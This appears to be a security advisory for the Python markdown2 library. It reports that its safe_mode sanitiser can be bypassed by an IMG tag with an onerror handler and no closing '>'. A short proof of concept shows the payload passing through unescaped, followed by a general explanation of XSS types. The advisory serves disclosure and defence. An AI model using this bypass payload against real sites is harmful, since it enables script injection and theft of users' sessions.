## Overview
[`markdown2`](http://pypi.python.org/pypi/markdown2) is A fast and complete Python implementation of Markdown.

Affected versions of the package are vulnerable to Cross-site Scripting (XSS) attacks via the `safe_mode` feature, which is supposed to sanitize user input against XSS. With a crafted payload, XSS can be triggered, as demonstrated by omitting the final '>' character from an IMG tag.

### PoC by Vineet Kumar
```py
>>> from markdown2 import markdown as mark
>>> mark('<img src="" onerror=alert(/XSS/)>', safe_mode=True)
u'<p>[HTML_REMOVED]</p>\n'
>>> mark('<img src="" onerror=alert(/XSS/) ', safe_mode=True) # Please notice the space at end of string.
u'<p><img src="" onerror=alert(/XSS/) </p>\n'
>>> mark('<img src="" onerror=alert(/XSS/)>', safe_mode="escape")
u'<p>&lt;img src="" onerror=alert(/XSS/)&gt;</p>\n'
>>> mark('<img src="" onerror=alert(/XSS/) ', safe_mode="escape")
u'<p><img src="" onerror=alert(/XSS/) </p>\n'
```

## Details
Cross-Site Scripting (XSS) attacks occur when an attacker tricks a user’s browser to execute malicious JavaScript code in the context of a victim’s domain. Such scripts can steal the user’s session cookies for the domain, scrape or modify its content, and perform or modify actions on the user’s behalf, actions typically blocked by the browser’s Same Origin Policy.

These attacks are possible by escaping the context of the web application and injecting malicious scripts in an otherwise trusted website. These scripts can introduce additional attributes (say, a "new" option in a dropdown list or a new link to a malicious site) and can potentially execute code on the clients side, unbeknown to the victim. This occurs when characters like \< \> \" \' are not escaped properly.

There are a few types of XSS:
- **Persistent XSS** is an attack in which the malicious code persists into the web app’s database.
- **Reflected XSS** is an which the website echoes back a portion of the request. The attacker needs to trick the user into clicking a malicious link (for instance through a phishing email or malicious JS on another page), which triggers the XSS attack.
- **DOM-based XSS** is an that occurs purely in the browser when client-side JavaScript echoes back a portion of the URL onto the page. DOM-Based XSS is notoriously hard to detect, as the server never gets a chance to see the attack taking place.

You can read more about `Cross-site Scripting (XSS)` on our [blog](https://snyk.io/blog/xss-attacks-the-next-wave/).

## Remediation
There is no fix version for `markdown2`.

## References
- [GitHub Issue](https://github.com/trentm/python-markdown2/issues/285)
